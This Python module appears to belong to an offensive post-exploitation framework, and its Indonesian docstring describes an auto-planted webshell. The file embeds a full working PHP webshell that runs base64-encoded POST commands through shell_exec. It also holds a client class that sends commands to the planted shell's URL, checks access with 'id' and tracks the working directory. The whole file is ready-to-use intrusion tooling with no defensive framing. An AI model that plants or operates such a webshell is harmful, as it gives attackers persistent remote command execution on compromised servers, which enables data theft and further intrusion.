from __future__ import annotations
"""Webshell PHP/JSP yang ditanam otomatis, dikendalikan base64 via HTTP."""
import base64
from .base import ShellBackend, ExecResult

PHP = """<?php
if(!isset($_POST['c'])){echo 'M4ZOK';exit;}
$c=base64_decode($_POST['c']);
$d=isset($_POST['d'])?base64_decode($_POST['d']):getcwd();
$o=shell_exec('cd '.escapeshellarg($d).' 2>/dev/null; '.$c.' 2>&1; echo "\\n__M4Z__$?");
echo base64_encode($o);
?>"""


class WebShell(ShellBackend):
    kind = "webshell"

    def __init__(self, ctx, sid, target, *, url: str):
        super().__init__(ctx, sid, target)
        self.url = url

    async def establish(self) -> bool:
        r = await self.exec("id")
        return "uid=" in r.out

    async def exec(self, cmd: str, timeout: int = 30) -> ExecResult:
        try:
            r = await self.ctx.http.post(
                self.url,
                data={"c": base64.b64encode(cmd.encode()).decode(),
                      "d": base64.b64encode(self.cwd.encode()).decode()},
                timeout=timeout)
            raw = base64.b64decode(r.text.strip() or b"")
            text = raw.decode("utf8", "ignore")
        except Exception as e:
            return ExecResult(out=f"[transport] {e}", rc=124)
        rc = 0
        if "__M4Z__" in text:
            text, _, tail = text.rpartition("__M4Z__")
            rc = int(tail.strip().splitlines()[0] or 0)
        if cmd.strip().startswith("cd "):
            self.cwd = cmd.strip()[3:].strip() or self.cwd
        return ExecResult(out=text[-400_000:], rc=rc)
